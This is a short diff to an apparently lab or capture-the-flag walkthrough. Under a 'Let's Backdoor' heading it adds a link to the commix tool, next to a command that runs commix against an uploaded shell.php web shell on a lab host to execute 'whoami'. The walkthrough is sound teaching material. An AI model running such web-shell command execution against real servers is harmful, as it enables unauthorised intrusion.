@@ -369,6 +369,9 @@ shell.php
 > According to the open-source and its documentation, The default `upload_dir` is located at `./server/php/files`
 
 ### Let's Backdoor
+
+https://github.com/commixproject/commix
+
 ```
 python3 commix.py http://grandline.htb/jQuery-File-Uploader/server/php/files/shell.php?cmd=whoami
 ```
